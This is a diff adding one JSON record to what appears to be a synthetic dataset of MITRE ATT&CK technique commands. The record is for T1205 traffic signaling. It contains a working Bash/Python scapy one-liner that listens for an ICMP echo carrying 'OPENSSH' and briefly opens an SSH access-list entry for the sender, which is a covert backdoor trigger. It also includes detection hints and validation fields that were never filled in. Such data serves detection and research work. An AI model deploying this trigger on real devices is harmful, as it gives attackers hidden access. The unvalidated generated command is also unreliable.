@@ -1,0 +1,23 @@
+{
+  "technique_id": "T1205",
+  "platform": "Network Devices",
+  "shell": "Bash",
+  "command": "sudo python3 -c 'from scapy.all import sniff,IP,ICMP,Raw; import os; p=sniff(filter=\"icmp[icmptype]==8\", lfilter=lambda x: x.haslayer(Raw) and b\"OPENSSH\" in bytes(x[Raw].load), count=1)[0]; os.system(f\"ciscoconf --apply \\\"ip access-list extended MGMT-ICMP; permit tcp host {p[IP].src} any eq 22\\\" && (sleep 120; ciscoconf --apply \\\"ip access-list extended MGMT-ICMP; no permit tcp host {p[IP].src} any eq 22\\\") &\")'",
+  "explanation": "Listens for an ICMP Echo containing the magic string OPENSSH and temporarily inserts an ACL permitting SSH from the source for 120 seconds via ciscoconf. Requires sudo due to raw packet sniffing.",
+  "rationale_steps": [
+    "Sniff ICMP echo requests and match a magic payload as the signal.",
+    "On match, push a temporary ACL entry via ciscoconf permitting TCP/22 from the sender, then remove it after 120s.",
+    "Traffic signaling is achieved using a non-standard ICMP payload trigger.",
+    "Detection: inspect ICMP payloads for strings like OPENSSH and audit ACL change logs."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1205-7a393370-087b5a8c",
+  "source_prompt_hash": "7a393370",
+  "timestamp_utc": "2025-09-30T06:01:37.763989Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
